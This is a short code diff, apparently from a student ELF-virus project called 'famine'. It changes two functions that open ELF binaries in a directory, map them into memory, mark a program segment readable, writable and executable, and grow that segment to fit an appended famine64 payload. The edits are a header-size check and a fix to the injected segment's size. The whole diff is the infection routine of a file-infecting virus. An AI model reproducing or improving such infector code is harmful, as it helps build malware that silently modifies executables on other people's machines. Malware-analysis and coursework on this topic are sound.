@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/06/17 20:02:19 by root             ###   ########.fr       */
+/*   Updated: 2018/06/20 23:36:23 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -105,12 +105,11 @@ void	get_dat_elf(char *dir, char *file)
 	if (fd == -1)
 		return ;
 	size = syscall(LSEEK, fd, 1, SEEK_END);
-	if (size <= 0)
+	if (size <= 0x40) // sizeof(Elf64_Ehdr)
 	{
 		syscall(CLOSE, fd);
 		return ;
 	}
-
 	data = (void *)syscall(MMAP, NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
 	if (data == MAP_FAILED)
 	{
@@ -192,7 +191,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 		iprogram->p_flags |= PF_R;
 		iprogram->p_flags |= PF_W;
 		iprogram->p_flags |= PF_X;
-		iprogram->p_memsz += famine64_size;
+		iprogram->p_memsz += isection->sh_size + famine64_size;
 		iprogram->p_filesz = iprogram->p_memsz;
 		while (iprogram->p_align < newsect.sh_offset + famine64_size)
 			iprogram->p_align += getpagesize();
